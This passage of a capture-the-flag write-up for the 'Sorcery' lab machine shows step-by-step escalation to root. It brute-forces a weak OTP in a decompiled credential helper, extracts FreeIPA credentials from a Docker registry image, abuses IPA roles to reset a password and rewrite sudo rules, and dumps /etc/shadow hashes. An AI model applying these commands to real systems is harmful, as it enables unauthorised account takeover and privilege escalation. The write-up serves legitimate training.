rebecca_smith@main:~$ echo 'http://localhost:5000' | docker-credential-docker-auth get
This account might be protected by two-factor authentication
In case login fails, try logging in with <password><otp>
{"Username":"rebecca_smith","Secret":"-7eAZDp9-f9mg"}
```

Credentials can be updated? 
```bash
rebecca_smith@main:~$ echo '{"ServerURL": "http://localhost:5000", "Username": "x", "Secret": "y"}' | docker-credential-docker-auth store
rebecca_smith@main:~$ echo 'http://localhost:5000' | docker-credential-docker-auth get
This account might be protected by two-factor authentication
In case login fails, try logging in with <password><otp>
{"Username":"x","Secret":"y"}
```

`erase` and `list` doesn't work.

Get the binary and dissect it
```bash
â””â”€$ sshpass -p '-7eAZDp9-f9mg' scp rebecca_smith@sorcery.htb:/usr/bin/docker-credential-docker-auth .
â””â”€$ file docker-credential-docker-auth
docker-credential-docker-auth: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=80b42387c3bddabffe562898e3136c7d5958ac38, stripped
â””â”€$ strings docker-credential-docker-auth -n 40 | tail
+System.Runtime.CompilerServices.VisualC.dll
-System.Runtime.InteropServices.JavaScript.dll
5System.Runtime.InteropServices.RuntimeInformation.dll
+System.Runtime.Serialization.Formatters.dll@
+System.Runtime.Serialization.Primitives.dll
+System.Security.Cryptography.Algorithms.dll@
)System.Security.Cryptography.Encoding.dll
(System.Security.Cryptography.OpenSsl.dll@
+System.Security.Cryptography.Primitives.dll
1System.Security.Cryptography.X509Certificates.dll
```

It's an ELF binary, written in C#? Wtf

dnSpy failed to open it, but ILSpy worked.

![Writeup-26.png](/assets/pentest/htb/sorcery/Writeup-26.png)

```cs
// docker-auth, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Program
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text.Json;
using Mono.Unix;

[CompilerGenerated]
internal class Program {
  private static void<Main> $(string[] args) {
    if (args.Length != 1) { Console.Error.WriteLine("Invalid arguments."); return; }
    if (!new Dictionary<string, (Action<object>, InputType)> {
        { "get", (HandleGet, InputType.Plain)    },
        { "store", (HandleStore, InputType.Json) },
        { "otp", (HandleOtp, InputType.None)     }
      }.TryGetValue(args[0], out var value)) {
      Console.WriteLine("Not implemented.");
      return;
    }
    dynamic val = "";
    if (value.Item2 != 0) {
      string text = Console.ReadLine();
      if (text == null) { Console.Error.WriteLine("Input is empty"); return; }
      switch (value.Item2) {
      case InputType.Plain: val = text; break;
      case InputType.Json:
        try {
          Dictionary<string, object> dictionary = JsonSerializer.Deserialize<Dictionary<string, object>> (text);
          if (dictionary == null) {  Console.Error.WriteLine("Invalid JSON format"); return; }
          val = dictionary;
        } catch (JsonException) {
          Console.Error.WriteLine("Invalid JSON data"); return;
        }
        break;
      }
    }

    value.Item1(val);

    static string GetCredsPath(string username) {
      return "/home/" + username + "/.docker/creds";
    }

    static UnixUserInfo GetCurrentExecutableOwner() {
      return new UnixFileInfo("/proc/self/exe").OwnerUser;
    }

    static void HandleGet(dynamic dynamicArgs) {
      byte[] buffer = Convert.FromBase64String(File.ReadAllText(GetCredsPath(GetCurrentExecutableOwner().UserName)));
      using Aes aes2 = Aes.Create();
      byte[] key2 = new byte[16];
      byte[] iV2 = new byte[16];
      aes2.Key = key2;
      aes2.IV = iV2;
      ICryptoTransform transform2 = aes2.CreateDecryptor(aes2.Key, aes2.IV);
      using MemoryStream stream2 = new MemoryStream(buffer);
      using CryptoStream stream3 = new CryptoStream(stream2, transform2, CryptoStreamMode.Read);
      using StreamReader streamReader = new StreamReader(stream3);
      string text2 = streamReader.ReadToEnd();
      Credentials credentials2;
      try { credentials2 = JsonSerializer.Deserialize<Credentials> (text2);  } 
      catch (JsonException) { Console.Error.WriteLine("Invalid credentials format"); return;}
      if (credentials2.Username == null) {
        Console.Error.WriteLine("Missing username");
      } else if (credentials2.Secret == null) {
        Console.Error.WriteLine("Missing secret");
      } else {
        Console.Error.WriteLine("This account might be protected by two-factor authentication");
        Console.Error.WriteLine("In case login fails, try logging in with<password><otp>");
        Console.WriteLine(text2);
      }
    }

    static void HandleOtp(dynamic dynamicArgs) {
      new Random(DateTime.Now.Minute / 10 + (int) GetCurrentExecutableOwner().UserId).Next(100000, 999999);
      Console.WriteLine("OTP is currently experimental. Please ask our admins for one");
    }
    
    static void HandleStore(dynamic dynamicArgs) {
      Dictionary<string, object> dictionary2 = dynamicArgs as Dictionary<string, object> ;
      if (!dictionary2.TryGetValue("Username", out dynamic value2)) {
        Console.Error.WriteLine("No username provided");
      } else {
        if (dictionary2.TryGetValue("Secret", out dynamic value3)) {
          Credentials credentials = default (Credentials);
          credentials.Username = Convert.ToString(value2);
          credentials.Secret = Convert.ToString(value3);
          Credentials value4 = credentials;
          using Aes aes = Aes.Create();
          byte[] key = new byte[16];
          byte[] iV = new byte[16];
          aes.Key = key;
          aes.IV = iV;
          ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
          using MemoryStream memoryStream = new MemoryStream();
          using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
          using(StreamWriter streamWriter = new StreamWriter(stream)) { streamWriter.Write(JsonSerializer.Serialize(value4)); }
          string contents = Convert.ToBase64String(memoryStream.ToArray());
          File.WriteAllText(GetCredsPath(GetCurrentExecutableOwner().UserName), contents);
          return;
        }
        Console.Error.WriteLine("No secret provided");
      }
    }
  }
}
```

`GetCredsPath` function seems to be vulnerable to path injection, if we can manipulate `/proc/self/exe` owner that is (most definitely not very possible).

### Docker

What we need is OTP, docker is a sitting duck and it's time to poke at it.

```cs
static void HandleOtp(dynamic dynamicArgs) {
	new Random(DateTime.Now.Minute / 10 + (int)GetCurrentExecutableOwner().UserId).Next(100000, 999999);
	Console.WriteLine("OTP is currently experimental. Please ask our admins for one");
}
```

There's only 6 possible OTP codes with above code:
```cs
// https://www.programiz.com/csharp-programming/online-compiler/
using System;

public class HelloWorld {
  public static void Main(string[] args) {
    int userId = 2003;
    int otp, seed, minute;
    for (minute = 0; minute < 6; minute++) {
      seed = minute + userId;
      otp = new Random(seed).Next(100000, 999999);
      Console.WriteLine($"[{minute+1}] {otp}");
    }
  }
}

/*
[1] 229732
[2] 699914
[3] 270098
[4] 740280
[5] 310463
[6] 780645
*/
```

```bash
rebecca_smith@main:~$ for otp in 229732 699914 270098 740280 310463 780645; do if curl 0:5000/v2 -sL -u "rebecca_smith:-7eAZDp9-f9mg${otp}" | grep -q "errors"; then echo "Wrong: PIN $otp"; else echo "Success: PIN $otp"; fi; done;
Wrong: PIN 229732
Wrong: PIN 699915
Wrong: PIN 270098
Wrong: PIN 740281
Success: PIN 310463
Wrong: PIN 780646
Wrong: PIN 350829
```

[https://hacktricks.boitatech.com.br/pentesting/5000-pentesting-docker-registry](https://hacktricks.boitatech.com.br/pentesting/5000-pentesting-docker-registry)

```bash
rebecca_smith@main:~$ curl -sL -u 'rebecca_smith:-7eAZDp9-f9mg310463' 0:5000/v2/_catalog
{"repositories":["test-domain-workstation"]}

rebecca_smith@main:~$ curl -sL -u 'rebecca_smith:-7eAZDp9-f9mg310463' 0:5000/v2/test-domain-workstation/tags/list
{"name":"test-domain-workstation","tags":["latest"]}

rebecca_smith@main:~$ curl -sL -u 'rebecca_smith:-7eAZDp9-f9mg780645' 0:5000/v2/test-domain-workstation/manifests/latest | jq '.history.[].v1Compatibility' -r | jq '.container_config.Cmd' -c
null
["COPY --chmod=0700 docker-entrypoint.sh /docker-entrypoint.sh # buildkit"]
["RUN /bin/sh -c apt-get install -y freeipa-client # buildkit"]
["RUN /bin/sh -c apt-get update # buildkit"]
["/bin/sh -c #(nop)  CMD [\"/bin/bash\"]"]
["/bin/sh -c #(nop) ADD file:34dc4f3ab7a694ecde47ff7a610be18591834c45f1d7251813267798412604e5 in / "]
["/bin/sh -c #(nop)  LABEL org.opencontainers.image.version=24.04"]
["/bin/sh -c #(nop)  LABEL org.opencontainers.image.ref.name=ubuntu"]
["/bin/sh -c #(nop)  ARG LAUNCHPAD_BUILD_ARCH"]
["/bin/sh -c #(nop)  ARG RELEASE"]

rebecca_smith@main:~$ curl -sL -u 'rebecca_smith:-7eAZDp9-f9mg780645' 0:5000/v2/test-domain-workstation/manifests/latest | jq '.fsLayers.[]' -c
{"blobSum":"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"}
{"blobSum":"sha256:292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787"}
{"blobSum":"sha256:bff382edc3a6db932abb361e3bd5aa09521886b0b79792616fc346b19a9497ea"}
{"blobSum":"sha256:92879ec4738326a2ab395b2427c2ba16d7dcf348f84477653a635c86d0146cb7"}
{"blobSum":"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"}
{"blobSum":"sha256:802008e7f7617aa11266de164e757a6c8d7bb57ed4c972cf7e9f519dd0a21708"}
{"blobSum":"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"}
{"blobSum":"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"}
{"blobSum":"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"}
{"blobSum":"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"}
```

Using `Accept: application/vnd.docker.distribution.manifest.v2+json` it's possible to view sizes before downloading blobs
```bash
rebecca_smith@main:~$ curl -sL -u 'rebecca_smith:-7eAZDp9-f9mg699914' 0:5000/v2/test-domain-workstation/manifests/latest -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' | jq '.layers[] | {size, digest}' -c
{"size":30610919,"digest":"sha256:802008e7f7617aa11266de164e757a6c8d7bb57ed4c972cf7e9f519dd0a21708"}
{"size":29979842,"digest":"sha256:92879ec4738326a2ab395b2427c2ba16d7dcf348f84477653a635c86d0146cb7"}
{"size":100598014,"digest":"sha256:bff382edc3a6db932abb361e3bd5aa09521886b0b79792616fc346b19a9497ea"}
{"size":246,"digest":"sha256:292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787"}
```

```bash
rebecca_smith@main:~$ curl -sL -u 'rebecca_smith:-7eAZDp9-f9mg699914' 0:5000/v2/test-domain-workstation/blobs/sha256:292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787 --output blob.tar
rebecca_smith@main:~$ tar -xvf blob.tar
docker-entrypoint.sh
rebecca_smith@main:~$ cat docker-entrypoint.sh
#!/bin/bash

ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir
```

## Privilege Escalation (ash_winter)

We are not able to `su` as this user, but can SSH.
```bash
â””â”€$ sshpass -p '3FEVPCT_c3xDH' ssh donna_adams@sorcery.htb
Last login: Tue Jul 22 18:25:20 2025 from 10.10.14.39
$ id
uid=1638400003(donna_adams) gid=1638400003(donna_adams) groups=1638400003(donna_adams)
donna_adams@main:~$ hostname
main.sorcery.htb
```

Something is not right.... We can't `su` while on `main`, but we can `ssh` into `main`?

### FreeIPA

[SpecterOps: Attacking FreeIPA â€” Part II Enumeration](https://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1)

Users:
```bash
donna_adams@main:~$ ldapsearch -Y gssapi -b "cn=users,cn=compat,dc=sorcery,dc=htb" 2>/dev/null | grep ^dn
dn: cn=users,cn=compat,dc=sorcery,dc=htb
dn: uid=ash_winter,cn=users,cn=compat,dc=sorcery,dc=htb
dn: uid=donna_adams,cn=users,cn=compat,dc=sorcery,dc=htb
dn: uid=admin,cn=users,cn=compat,dc=sorcery,dc=htb
```

Computers:
```bash
donna_adams@main:~$ ldapsearch -Y gssapi -b "cn=computers,cn=accounts,dc=sorcery,dc=htb" 2>/dev/null | grep ^dn
dn: cn=computers,cn=accounts,dc=sorcery,dc=htb
dn: fqdn=dc01.sorcery.htb,cn=computers,cn=accounts,dc=sorcery,dc=htb
dn: cn=cosTemplates,cn=computers,cn=accounts,dc=sorcery,dc=htb
dn: fqdn=main.sorcery.htb,cn=computers,cn=accounts,dc=sorcery,dc=htb
```

The FreeIPA also provides UI access on web, maybe it will be better then raw ldap queries...
```bash
donna_adams@main:~$ getent hosts
127.0.0.1       localhost main.sorcery.htb sorcery sorcery.htb
127.0.1.1       ubuntu-2404
127.0.0.1       ip6-localhost ip6-loopback
172.23.0.2      dc01.sorcery.htb
donna_adams@main:~$ curl 172.23.0.2 -Ls | grep title
    <title>Identity Management</title>
```

Port forward, and also make sure to update DNS so `dc01.sorcery.htb` resolves to `localhost`.
```bash
â””â”€$ sshpass -p '3FEVPCT_c3xDH' ssh donna_adams@sorcery.htb -L 80:172.23.0.2:80 -L 443:172.23.0.2:443
```

Login as donna

![Writeup-27.png](/assets/pentest/htb/sorcery/Writeup-27.png)

Nothing juicy pops up, we are part of `ipausers` group which can't do much. HBAC rules says we can sudo, but if we try we are then denied?..

![Writeup-28.png](/assets/pentest/htb/sorcery/Writeup-28.png)

- [SpecterOps: Attacking FreeIPA â€” Part III: Finding A Path](https://posts.specterops.io/attacking-freeipa-part-iii-finding-a-path-677405b5b95e)
- [https://angelica.gitbook.io/hacktricks/linux-hardening/freeipa-pentesting](https://angelica.gitbook.io/hacktricks/linux-hardening/freeipa-pentesting)

```bash
donna_adams@main:~$ ipa user-show donna_adams --all
  dn: uid=donna_adams,cn=users,cn=accounts,dc=sorcery,dc=htb
  User login: donna_adams
  First name: donna
  Last name: adams
  Full name: donna adams
  Display name: donna adams
  Initials: da
  Home directory: /home/donna_adams
  GECOS: donna adams
  Login shell: /bin/bash
  Principal name: donna_adams@SORCERY.HTB
  Principal alias: donna_adams@SORCERY.HTB
  User password expiration: 20400101000000Z
  Email address: donna_adams@sorcery.htb
  UID: 1638400003
  GID: 1638400003
  Account disabled: False
  Preserved user: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: change_userPassword_ash_winter_ldap
  Kerberos keys available: True
  ipantsecurityidentifier: S-1-5-21-820725746-4072777037-1046661441-1003
  ipauniqueid: c60a9328-96eb-11ef-ace5-0242ac170002
  objectclass: top, person, organizationalperson, inetorgperson, inetuser, posixaccount, krbprincipalaux, krbticketpolicyaux, ipaobject, ipasshuser, ipaSshGroupOfPubKeys, mepOriginEntry, ipantuserattrs
```

ðŸ¤¨
```
  Indirect Member of role: change_userPassword_ash_winter_ldap
```

```bash
donna_adams@main:~$ ipa user-mod ash_winter --password
Password: password
Enter Password again to verify: password
--------------------------
Modified user "ash_winter"
--------------------------
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_sudo, allow_ssh
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
```

## Privilege Escalation (root)

When we reset the password for this user after first login it expires and requires change (can't be same)
```bash
â””â”€$ ssh ash_winter@sorcery.htb
Warning: Permanently added 'sorcery.htb' (ED25519) to the list of known hosts.
(ash_winter@sorcery.htb) Password: password
Password expired. Change your password now.
(ash_winter@sorcery.htb) Current Password: password
(ash_winter@sorcery.htb) New password: Password123$
(ash_winter@sorcery.htb) Retype new password: Password123$
Creating directory '/home/ash_winter'.
ash_winter@main:~$ id
uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=1638400004(ash_winter)

ash_winter@main:~$ ipa user-show ash_winter --all
  dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
  User login: ash_winter
  First name: ash
  Last name: winter
  Full name: ash winter
  Display name: ash winter
  Initials: aw
  Home directory: /home/ash_winter
  GECOS: ash winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  User password expiration: 20251021124247Z
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Preserved user: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
  ipantsecurityidentifier: S-1-5-21-820725746-4072777037-1046661441-1004
  ipauniqueid: c862fa48-96eb-11ef-9f47-0242ac170002
  krblastpwdchange: 20250723124247Z
  objectclass: top, person, organizationalperson, inetorgperson, inetuser, posixaccount, krbprincipalaux, krbticketpolicyaux, ipaobject, ipasshuser, ipaSshGroupOfPubKeys, mepOriginEntry, ipantuserattrs
```

`sysadmin` is a group, so we can probably add ourselves to it.

![Writeup-29.png](/assets/pentest/htb/sorcery/Writeup-29.png)

```bash
ash_winter@main:~$ ipa group-add-member sysadmins --users=ash_winter
  Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
-------------------------
Number of members added 1
-------------------------
```

Now we have a new `role`: **manage_sudorules_ldap**

```bash
ash_winter@main:~$ ipa sudorule-find
-------------------
1 Sudo Rule matched
-------------------
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
----------------------------
Number of entries returned 1
----------------------------

ash_winter@main:~$ ipa sudorule-show allow_sudo
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin
```

As of now we already can `sudo`, `allow_sudo` must mean access to any binary with sudo.
```bash
ash_winter@main:~$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
```

Add yourself to the rules
```bash
ash_winter@main:~$ ipa sudorule-add-user allow_sudo --users=ash_winter
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin, ash_winter
-------------------------
Number of members added 1
-------------------------
```

Restart the **sssd** for changes to take effects immediately (might need to relogin)
```bash
ash_winter@main:~$ sudo /usr/bin/systemctl restart sssd
ash_winter@main:~$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL
```

```bash
ash_winter@main:~$ sudo su
[sudo] password for ash_winter: Password123$
root@main:/home/ash_winter# id
uid=0(root) gid=0(root) groups=0(root)
```

Alternatively we could have added the rule ourselves if it didn't exist: [https://freeipa.readthedocs.io/en/latest/workshop/8-sudorule.html](https://freeipa.readthedocs.io/en/latest/workshop/8-sudorule.html)

```bash
# rule name = All
# Create rule for ALL:ALL
ipa sudorule-add All --hostcat=all --runasusercat=all --runasgroupcat=all --cmdcat=all 
# Add NOPASSWD option
ipa sudorule-add-option All --sudooption='!authenticate'
# Add user
ipa sudorule-add-user All --users=ash_winter
# Restart service to take effect immediately
sudo /usr/bin/systemctl restart sssd
```

```bash
$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) NOPASSWD: ALL
```

### Root.txt

```bash
root@main:~# cat root.txt
4b5a0d37d9550caf64b3938d3ea690b1
```

P.S.
```bash
root@main:~# cat /etc/shadow | grep '\$'
root:$y$j9T$uARPeh9eNYp8lmc7j1yn3.$kFW1vAuJDh0mdQMobTjnUaqMhjiQDWDf7.E5rn4MGrA:20027:0:99999:7:::
user:$y$j9T$MCBtCUfCG6N3kGK7d/mnK0$ttcRlL8zh7bKEfBqQLHeOg8z4RRpbCUNS/Y4nHdti70:20027:0:99999:7:::
tom_summers:$y$j9T$ZgIta8NVQciOoj0o6wyzN1$t0NsMo3iUg9CesbdRwovVMx3XCi5Fzjj/cL.kiASid/:20027::::::
tom_summers_admin:$y$j9T$xdMvofwsIrlzDXn1lcEj10$oLkCrlTD7UiLu55F/tpNdk.PIvAme9s0vE/5VqqqV7.:20027::::::
rebecca_smith:$y$j9T$Fcu4jakUQoutyXR2ovau01$BgcnYB1FU7JsnzvsTItA7IW/Al4.LOszOT1.ISISYg/:20027::::::
```